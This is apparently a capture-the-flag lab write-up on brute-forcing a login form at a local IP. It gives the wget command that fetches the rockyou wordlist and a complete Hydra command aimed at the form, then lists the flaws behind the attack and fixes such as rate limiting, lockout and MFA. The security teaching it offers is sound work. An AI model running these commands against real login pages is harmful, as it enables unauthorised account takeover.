# Brute-Force Attack — Documentation

## How I Found It

**Initial reconnaissance:**
- Visited `http://192.168.1.16/index.php?page=signin`
- Tested login form with wrong credentials
- Observed consistent failure response: `images/WrongAnswer.gif`
- No CAPTCHA, no rate limiting, no account lockout detected

## How I Exploited It

**Preparation:**
```bash
# Download password wordlist
mkdir -p ~/wordlists && cd ~/wordlists
wget https://github.com/danielmiessler/SecLists/raw/master/Passwords/Leaked-Databases/rockyou.txt.tar.gz
tar -xvzf rockyou.txt.tar.gz
```

**Attack using Hydra:**
```bash
hydra -l admin -P ~/wordlists/rockyou.txt -F \
  192.168.1.16 \
  http-get-form "/index.php:page=signin&username=^USER^&password=^PASS^&Login=Login:F=images/WrongAnswer.gif"
```
**Parameters:**
- `-l admin` → username to test
- `-P ~/wordlists/rockyou.txt` → password list
- `-F` → stop on first success
- `F=images/WrongAnswer.gif` → failure marker

**Flag obtained:**
b3a6e43ddf8b4bbb4125e5e7d23040433827759d4de1c04ea63907479a80a6b2

## Why It Works

**Vulnerabilities:**
1. **Predictable failure response** → Easy to detect success/failure
2. **No rate limiting** → Unlimited attempts from same IP
3. **No account lockout** → No temporary blocking after failures
4. **Credentials in GET** → Exposed in URLs/logs
5. **No CAPTCHA** → No bot protection

## How to Fix It

**Core principle:** Make brute-forcing slow, detectable, and ultimately impossible.

**Essential fixes:**
1. **Rate limiting** - Max 5 login attempts per minute per IP
2. **Account lockout** - Lock account for 15 minutes after 5 failed attempts  
3. **CAPTCHA** - Require after 3 failed attempts
4. **Use POST** - Never send credentials in URL
5. **Generic errors** - Don't reveal if username exists
6. **Strong passwords** - Enforce minimum complexity
7. **Multi-Factor Authentication** - Best protection against brute force


## References

- OWASP Authentication Cheat Sheet — https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html
- CWE-307 — https://cwe.mitre.org/data/definitions/307.html
- CWE-307: Improper Restriction of Excessive Authentication Attempts
- OWASP A07:2021 – Identification and Authentication Failures

